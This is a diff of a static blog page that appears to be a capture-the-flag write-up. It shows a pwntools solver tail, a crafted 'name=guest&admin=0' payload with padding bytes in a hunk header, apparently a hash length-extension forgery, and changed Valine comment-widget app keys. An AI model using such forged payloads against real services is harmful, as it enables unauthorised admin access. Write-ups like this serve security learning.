+</span></span><span class="line"><span class="cl">    <span class="n">ans</span> <span class="o">+=</span> <span class="n">f</span><span class="s">&#39;{_eval(a, op, b)}</span><span class="se">\n</span><span class="s">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="lucky">Lucky</h1>
 <h2 id="you-guess">you-guess</h2>
@@ -1768,9 +1768,9 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pacman -S poppler
-pdftohtml --help
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pacman -S poppler
+</span></span><span class="line"><span class="cl">pdftohtml --help
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="this-is-a-pen">this is a pen</h2>
 <blockquote>
@@ -1835,9 +1835,9 @@ pdftohtml --help
   <script type="text/javascript">
     new Valine({
         el: '#vcomments' ,
-        serverURLs: '',
-        appId: 'fSbXaElXXTznggVXiWy8NFBU-gzGzoHsz',
-        appKey: 'kK3SxB14xAACgHftKrSaBRDU',
+        serverURLs: 'https:\/\/0mqcauyd.api.lncldglobal.com',
+        appId: '0mQCAuYdR6NE9gIVBd6rDEjY-MdYXbMMI',
+        appKey: 'CBACoI7HhLeuROO39gpYpYDl',
         notify:  false ,
         verify:  false ,
         avatar:'mm',
@@ -1897,7 +1897,7 @@ pdftohtml --help
 
 
 
-<script type="text/javascript" src="/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js"></script>
+<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
 
 
 <script type="application/javascript">
